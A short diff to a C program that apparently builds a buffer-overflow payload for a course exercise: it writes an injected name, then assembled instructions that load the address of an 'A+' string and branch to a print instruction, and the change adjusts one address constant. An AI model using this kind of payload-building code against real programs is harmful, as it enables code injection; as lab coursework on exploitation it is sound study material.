@@ -27,7 +27,7 @@ int main(void) {
     fwrite(pcInject, sizeof(char), iNameLength, psFile);
     /* write instructions */
     /* put address of new A+ string in reg 0 */
-    uiAdr = MiniAssembler_adr(0, 0x420071, 0x420068);
+    uiAdr = MiniAssembler_adr(0, 0x420070, 0x420068);
     fwrite(&uiAdr, sizeof(unsigned int), 1, psFile);
     i = iNameLength + 4;
     /* branch to print instr (0x4008ac is addr of print instr in main,
